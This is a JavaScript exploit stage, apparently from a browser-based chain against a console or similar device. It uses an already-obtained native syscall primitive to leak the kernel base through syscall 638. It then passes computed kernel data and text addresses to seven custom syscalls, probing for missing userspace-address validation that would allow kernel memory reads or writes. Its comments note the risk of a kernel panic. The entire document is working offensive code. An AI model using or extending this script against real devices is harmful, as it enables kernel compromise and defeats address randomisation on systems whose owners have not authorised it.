// Cross-boundary relocation discriminator, DIRECTED half: kernel
// domains. Operator-directed experiment hunting missing userspace
// address validation (copyin-bypass class) in the relocation engine
// and adjacent custom syscalls. kbase is derived at runtime via 638
// sel=0 (computed = kbase + 0x3B1AABA0; matches 0xFFFFFFFFFFFFABA0 on
// three prior boots). KERNEL_DATA = kbase + 0x3AC30DF0 (the 638-leaked
// fixed data pointer's address); KERNEL_TEXT = kbase (page-aligned
// text base). Domain order per syscall: KERNEL_DATA first (data
// read/write least likely to fault), KERNEL_TEXT last (read-only — a
// kernel-side WRITE there faults = console panic risk; this run is
// operator-directed). 14 calls total: {596,599,601,602,605,606,617} x
// {kd, kt}, arg2 = 0x1000. Full restore, PID verified.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native ||
      typeof native.call !== "function" ||
      typeof native.call64 !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.sys638 !== "number")
    throw new Error("chain_or_call64_missing");
  var frame = native.frame;
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("k2b_preflight");
  // Derive kbase via 638 sel=0
  phase = "derive_kbase";
  var out2Off = 0x1e00, out3Off = 0x1e10;
  var out2Addr = native.frameAddress + out2Off;
  var out3Addr = native.frameAddress + out3Off;
  var fv = new DataView(frame.buffer);
  var o2orig = Array.from(frame.subarray(out2Off, out2Off + 32));
  var c638 = native.call("sys638",
    [0, out2Addr, out3Addr]);
  var e638 = (c638.value === -1) ? native.readErrno() : null;
  if (c638.value !== 0)
    throw new Error("call638_failed_" + e638);
  var klo = fv.getUint32(out2Off, true);
  var khi = fv.getUint32(out2Off + 4, true);
  // kbase = computed - 0x3B1AABA0 (no-borrow path expected; general)
  var OFF = 0x3B1AABA0;
  var blo = (klo - OFF) >>> 0;
  var bhi = khi;
  if (klo < OFF) { blo = (klo - OFF) >>> 0; bhi = (khi - 1) >>> 0; }
  // KERNEL_DATA = kbase + 0x3AC30DF0 (64-bit add with carry)
  var DOFF = 0x3AC30DF0;
  var dlo = (blo + DOFF) >>> 0;
  var dhi = (bhi + ((blo + DOFF) > 0xffffffff ? 1 : 0)) >>> 0;
  var kdArg = [dlo, dhi];
  var ktArg = [blo, bhi];
  var lenArg = [0x1000, 0];
  mark("k2b_638ok");
  var names = ["sys596", "sys599", "sys601", "sys602",
    "sys605", "sys606", "sys617"];
  var lines = [];
  for (var i = 0; i < names.length; i++) {
    var name = names[i];
    phase = name;
    if (!native.wrappers[name]) {
      lines.push(name.slice(3) + ":absent");
      continue;
    }
    var dc = native.call64(name, [kdArg, lenArg]);
    var de = (dc.value === -1) ? native.readErrno() : null;
    lines.push(name.slice(3) + ":kd(" + dc.value + "/" +
      (de === null ? "ok" : de) + ")");
  }
  mark("k2b_kd_done");
  for (var j = 0; j < names.length; j++) {
    var name2 = names[j];
    phase = name2 + "_kt";
    if (!native.wrappers[name2]) continue;
    var tc = native.call64(name2, [ktArg, lenArg]);
    var te = (tc.value === -1) ? native.readErrno() : null;
    lines.push(name2.slice(3) + ":kt(" + tc.value + "/" +
      (te === null ? "ok" : te) + ")");
  }
  mark("k2b_kt_done");
  for (var r = 0; r < 32; r++) frame[out2Off + r] = o2orig[r];
  var after = native.call("getpid", []);
  mark("k2b_done");
  var linesA = [], linesB = [];
  for (var li = 0; li < lines.length; li++) {
    if (linesA.join(" | ").length + lines[li].length < 440)
      linesA.push(lines[li]);
    else linesB.push(lines[li]);
  }
  result = { id: "kptr_kerndom_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { kbase: bhi.toString(16) + baddzero(blo),
      lines_a: linesA.join(" | "),
      lines_b: linesB.join(" | "),
      pid_ok: after.value === before.value && after.high === 0 } };
  function baddzero(lo) {
    var h = lo.toString(16);
    while (h.length < 8) h = "0" + h;
    return h;
  }
} catch (error) {
  result = { id: "kptr_kerndom_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
